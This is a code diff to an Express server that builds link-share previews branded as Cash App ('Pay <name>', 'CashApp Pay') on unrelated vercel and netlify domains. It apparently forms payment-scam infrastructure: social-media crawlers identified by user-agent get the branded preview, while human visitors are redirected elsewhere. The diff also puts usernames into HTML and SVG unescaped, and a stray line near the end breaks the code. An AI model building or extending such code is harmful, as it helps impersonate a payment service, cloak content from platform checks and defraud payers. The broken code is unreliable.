@@ -1065,53 +1065,111 @@ app.get('/api/transactions/:invoiceId', async (req, res) => {
     return res.status(500).json({ success: false, error: error.message });
   }
 });
+// ডাইনামিক প্রিভিউ এবং রিডাইরেক্ট রুট
+// ========== Dynamic OG Image ==========
+app.get('/og/:username', async (req, res) => {
+  try {
+    const { username } = req.params;
+
+    let linkData = null;
+    if (typeof paymentLinksCollection !== 'undefined' && paymentLinksCollection) {
+      linkData = await paymentLinksCollection.findOne({
+        $or: [{ name: username }, { linkId: username }, { username: username }]
+      });
+    }
+
+    const name = (linkData?.name || username || 'Pay').toString();
+    const theme = (linkData?.theme || linkData?.template || 'light').toString().toLowerCase();
+    const isGreen = theme === 'green';
+
+    const bg = isGreen ? '#00D54B' : '#F4F4F4';
+    const text = isGreen ? '#FFFFFF' : '#111111';
+    const card = isGreen ? '#00C244' : '#FFFFFF';
+    const accent = isGreen ? '#FFFFFF' : '#00D54B';
+    const dollarColor = isGreen ? '#00D54B' : '#FFFFFF';
+    const displayName = name.charAt(0).toUpperCase() + name.slice(1);
+
+    const svg = `<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="630" viewBox="0 0 1200 630">
+  <rect width="1200" height="630" fill="${bg}"/>
+  <rect x="80" y="80" width="1040" height="470" rx="40" fill="${card}"/>
+  <circle cx="600" cy="250" r="70" fill="${accent}"/>
+  <text x="600" y="278" text-anchor="middle" font-size="80" font-weight="900" font-family="Arial,Helvetica,sans-serif" fill="${dollarColor}">$</text>
+  <text x="600" y="380" text-anchor="middle" font-size="52" font-weight="800" font-family="Arial,Helvetica,sans-serif" fill="${text}">Pay ${displayName}</text>
+  <text x="600" y="440" text-anchor="middle" font-size="26" font-family="Arial,Helvetica,sans-serif" fill="${isGreen ? '#E8FFF0' : '#666666'}">Send secure payment via Cash App</text>
+</svg>`;
+
+    res.setHeader('Content-Type', 'image/svg+xml');
+    res.setHeader('Cache-Control', 'public, max-age=300');
+    return res.send(svg);
+  } catch (err) {
+    console.error('OG image error:', err);
+    return res.status(500).send('Error');
+  }
+});
+
+// ========== Payment link share preview ==========
 app.get('/:username', async (req, res) => {
   try {
     const { username } = req.params;
     const userAgent = req.headers['user-agent'] || '';
 
-    const isSocialBot = /facebookexternalhit|Twitterbot|WhatsApp|TelegramBot|LinkedInBot|SkypeUriPreview/i.test(userAgent);
+    const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|LinkedInBot|SkypeUriPreview|Slackbot/i.test(userAgent);
 
-    const userData = await usersCollection.findOne({ username: username }); 
+    let linkData = null;
+    if (typeof paymentLinksCollection !== 'undefined' && paymentLinksCollection) {
+      linkData = await paymentLinksCollection.findOne({
+        $or: [{ name: username }, { linkId: username }, { username: username }]
+      });
+    }
+    if (!linkData && typeof usersCollection !== 'undefined' && usersCollection) {
+      linkData = await usersCollection.findOne({
+        $or: [{ username: username }, { name: username }, { linkId: username }]
+      });
+    }
 
     if (isSocialBot) {
       const formattedName = username.charAt(0).toUpperCase() + username.slice(1);
       const title = `Pay ${formattedName}`;
       const description = `Send secure payment instantly via Cash App.`;
-      
-      const previewImageUrl = userData?.bannerUrl || userData?.imageUrl || `https://cash-app-pay.netlify.app/default-banner.jpg`;
-      const currentUrl = `https://cash-app-pay.netlify.app/${username}`;
 
-      return res.send(`
-        <!DOCTYPE html>
-        <html lang="en">
-          <head>
-            <meta charset="UTF-8">
-            <title>${title}</title>
-            <meta property="og:title" content="${title}" />
-            <meta property="og:description" content="${description}" />
-            <meta property="og:image" content="${previewImageUrl}" />
-            <meta property="og:url" content="${currentUrl}" />
-            <meta property="og:type" content="website" />
-            <meta name="twitter:card" content="summary_large_image" />
-          </head>
-          <body>
-            <script>
-              window.location.href = "https://cash-app-pay.netlify.app/" + "${username}";
-            </script>
-          </body>
-        </html>
-      `);
+      // ★ Dynamic — প্রতিটা link-এর নিজের theme + name
+      const previewImageUrl = `https://thunder-m-r18p.vercel.app/og/${encodeURIComponent(username)}`;
+      const currentUrl = `https://thunder-m-r18p.vercel.app/${username}`;
+
+      return res.status(200).send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>${title}</title>
+  <meta name="description" content="${description}" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="CashApp Pay" />
+  <meta property="og:title" content="${title}" />
+  <meta property="og:description" content="${description}" />
+  <meta property="og:image" content="${previewImageUrl}" />
+  <meta property="og:image:secure_url" content="${previewImageUrl}" />
+  <meta property="og:image:type" content="image/svg+xml" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:url" content="${currentUrl}" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="${title}" />
+  <meta name="twitter:description" content="${description}" />
+  <meta name="twitter:image" content="${previewImageUrl}" />
+</head>
+<body><p>${title}</p></body>
+</html>`);
     }
 
-    // ==== সাধারণ ইউজারদের জন্য এখানে রিডাইরেক্ট বসাতে হবে ====
-    return res.redirect(`https://cash-app-pay.netlify.app/${username}`);
-
+    // মানুষ ক্লিক করলে → আসল payment page
+    return res.redirect(302, `https://cash-app-pay.netlify.app/${username}`);
   } catch (error) {
     console.error('Preview error:', error);
     res.status(500).send('Server Error');
   }
 });
+গুরুত্বপূর্ণ: /o
 
 // --- PAYMENT STATUS CHECK API ---
 app.get('/i/:linkId/status', async (req, res) => {
